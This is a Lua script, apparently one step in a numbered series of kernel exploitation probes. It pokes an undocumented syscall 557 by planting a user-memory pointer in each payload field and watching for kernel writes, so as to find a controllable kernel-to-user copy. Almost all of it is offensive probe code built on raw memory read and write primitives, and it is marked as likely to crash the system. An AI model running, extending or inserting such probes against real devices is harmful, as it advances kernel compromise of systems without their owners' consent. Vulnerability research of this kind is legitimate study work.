-- CRASH_CLASS: HIGH
-- PROBE 787a: is one of the four payload qwords a user pointer the job writes?
--
-- 784a showed an all-0xFF payload does not fault, but it stalled the family for
-- ~30 s (785a failed, 786a recovered), so the worker does look at something.
-- Put our own page in each qword position in turn, run the job, and watch the
-- page for writes. A page that changes is a kernel-to-user copy we control.
print("=== PROBE 787a: SYS 557 PAYLOAD FIELDS ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a)
    a=to_num(a); if a<0 then a=a+18446744073709551616 end
    return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296))
end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "ERR" end
    return to_num(r)
end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local function alive() return tostring(call(mk(20),0,0,0,0,0,0)) end
local pl=to_num(memory.alloc(0x100)); local tgt=to_num(memory.alloc(0x1000))
local function spin(n) for i=1,n do call(mk(20),0,0,0,0,0,0) end end
local function fill(v) for i=0,0x1000-8,8 do wq(tgt+i,v) end end
local function scan()
    local hits=0
    for i=0,0x1000-8,8 do if rq(tgt+i)~=0xAAAAAAAAAAAAAAAA then hits=hits+1 end end
    return hits
end
fill(0xAAAAAAAAAAAAAAAA)
print(string.format("[0] page=%X payload=%X alive=%s",tgt,pl,alive()))
local function case(tag,slot)
    zero(pl,0x100)
    if slot then wq(pl+slot*8, tgt) end
    fill(0xAAAAAAAAAAAAAAAA)
    local r=call(mk(557),pl,0x1000,0,0,0,0)
    spin(2000)
    local hits=scan()
    print(string.format("[%s] slot=%s create=%s changed=%d alive=%s",tag,tostring(slot),tostring(r),hits,alive()))
    if type(r)=="number" and r>0 then
        local d=call(mk(558),r,0,0,0,0,0)
        print(string.format("[%s] destroy=%s alive=%s",tag,tostring(d),alive()))
    end
end
case("A",nil)
case("B",0)
case("C",1)
case("D",2)
case("E",3)
-- [F] two qwords: pointer + length
zero(pl,0x100)
wq(pl,tgt); wq(pl+8,0x40)
fill(0xAAAAAAAAAAAAAAAA)
local rf=call(mk(557),pl,0x1000,0,0,0,0)
spin(2000)
print(string.format("[F] ptr+len create=%s changed=%d alive=%s",tostring(rf),scan(),alive()))
if type(rf)=="number" and rf>0 then print("[F] destroy="..tostring(call(mk(558),rf,0,0,0,0,0))) end
print("[G] final alive="..alive())
print("=== 787a DONE ===")
